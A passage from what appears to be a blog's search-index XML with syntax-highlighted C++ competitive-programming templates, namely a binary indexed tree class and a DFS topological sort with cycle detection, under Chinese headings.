树状数组</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">BiIndexTree</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> Biarray<span class="token punctuation">;</span>    <span class="token function">BiIndexTree</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">n</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">Biarray</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">lowbit</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> x <span class="token operator">&amp;</span> <span class="token operator">-</span>x<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">add</span> <span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> n<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            Biarray<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">+=</span> k<span class="token punctuation">;</span>            x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token function">lowbit</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">getsum</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            ans <span class="token operator">=</span> ans <span class="token operator">+</span> Biarray<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>            x <span class="token operator">-=</span> <span class="token function">lowbit</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h3 id="28、拓扑排序"><a href="#28、拓扑排序" class="headerlink" title="28、拓扑排序"></a>28、拓扑排序</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">//点</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> vis<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> mp<span class="token punctuation">;</span> <span class="token comment">//边</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> result<span class="token punctuation">;</span> <span class="token comment">// 结果</span><span class="token keyword">bool</span> vaild <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vis<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> v<span class="token operator">:</span>mp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vaild<span class="token punctuation">)</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            vaild <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    vis<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    result<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">topo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num <span class="token operator">&amp;&amp;</span> vaild<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vaild<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">reverse</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
